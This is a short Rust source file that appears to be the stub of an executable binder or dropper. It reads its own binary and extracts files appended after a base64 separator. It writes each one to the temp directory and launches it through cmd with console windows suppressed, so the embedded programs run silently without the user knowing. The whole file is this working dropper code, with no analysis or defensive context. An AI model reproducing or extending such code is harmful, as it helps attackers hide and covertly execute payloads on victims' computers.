#![windows_subsystem = "windows"]

mod crypto;

use std::io::Read;
use std::os::windows::process::CommandExt;
use std::fs;

fn main() {
    // read self bytes,
    // then find seperator
    let selfile = match std::fs::read(std::env::current_exe().unwrap()) {
        Ok(file) => {
            file
        }
        Err(e) => {
            return
        }
    };

    // find seperator
    let mut str = String::from_utf8_lossy(selfile.as_slice());
    let mut name_extension = Vec::new();
    let mut files= Vec::new();
    let seperator = &base64::encode("쟑맯됽뱫뷵");
    for i in 1..str.split(seperator).count() {
        let splits = str.split(seperator).collect::<Vec<&str>>();
        let bytes = base64::decode(splits[i]).unwrap();
        if i % 2 == 1 {
            name_extension.push(String::from_utf8(bytes.clone()).unwrap());
        } else {
            files.push(bytes.clone());
        }
    }

    for i in 0..files.len() {
        let f = &files[i];
        std::fs::write(std::env::temp_dir().join(format!("{}{}.{}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy(), i, name_extension[i])), f);
        std::process::Command::new("cmd")
            .creation_flags(0x08000000)
            .arg("/c")// hide flags
            .raw_arg(format!("\"{}\"", std::env::temp_dir().join(format!("{}{}.{}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy(), i, name_extension[i])).to_string_lossy()))
            .spawn();
    }
}
